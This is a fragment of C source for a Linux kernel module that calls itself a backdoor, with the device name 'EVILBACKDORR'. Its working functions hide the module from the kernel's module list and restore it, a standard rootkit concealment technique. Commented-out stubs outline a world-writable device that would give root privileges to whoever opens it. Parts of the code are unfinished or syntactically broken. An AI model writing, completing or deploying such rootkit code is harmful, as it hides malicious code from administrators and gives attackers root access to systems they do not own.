#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>

#define DEVICE_NAME "EVILBACKDORR"


// void SetSuperUser(struct inode *, struct file *){

// }

// static struct miscdevice miscd  = {
//     .minor = MISC_DYNAMIC_MINOR;
//     .name = DEVICE_NAME;
//     .mode = 0777;
// };

// if hiden_switch == 0 is Hide Kernel
// if hiden_switch == 1 is Show Kernel
extern int hiden_switch_status = 0; 
static struct list_head *previse_list;
void HideModule(void){
    previse_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hiden_switch_status =0;
}

void ShowModule(void){
    list_add(&THIS_MODULE->list,previse_list);
    hiden_switch_status = 1;
}




// int BackdoorDeviceDel(){

// }



// int CreateBackdoorDevice(){
//     miscd.fops->open = SetSuperUser;
// }